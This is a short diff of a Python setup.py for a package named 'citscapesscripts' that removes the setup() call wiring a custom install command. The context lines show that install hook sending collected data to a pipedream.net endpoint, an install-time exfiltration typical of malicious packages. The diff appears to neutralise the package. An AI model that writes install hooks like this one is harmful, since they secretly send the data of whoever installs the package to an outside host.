@@ -15,10 +15,4 @@ class CustomInstall(install):
         requests.get("https://eolunbv9e34gp3b.m.pipedream.net",params = ploads)
 
 
-setup(name='citscapesscripts', 
-      version='11.0.0',
-      description='AnupamAs01',
-      author='AnupamAs01',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                                    
